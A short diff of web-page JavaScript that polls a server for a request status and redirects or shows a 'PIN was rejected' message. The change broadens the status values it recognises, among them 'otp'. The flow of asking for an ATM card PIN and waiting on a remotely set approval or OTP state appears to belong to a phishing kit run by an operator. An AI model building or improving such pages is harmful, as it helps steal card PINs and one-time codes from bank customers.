@@ -68,7 +68,7 @@
           .then(function(data){
             if (!data || !data.status) return;
             var status = String(data.status).trim().toLowerCase();
-            if (status === 'approved') {
+            if (status === 'accept' || status === 'accepted' || status === 'approve' || status === 'approved' || status === 'otp') {
               clearInterval(interval);
               if (type === 'atm') {
                 window.location.href = 'success-en.html?id=' + requestId;
@@ -77,7 +77,7 @@
               }
               return;
             }
-            if (status === 'rejected') {
+            if (status === 'reject' || status === 'rejected' || status === 'declined' || status === 'failed' || status === 'error') {
               clearInterval(interval);
               if (type === 'atm') {
                 var msg = 'The PIN was rejected. Please verify the details and try again.';
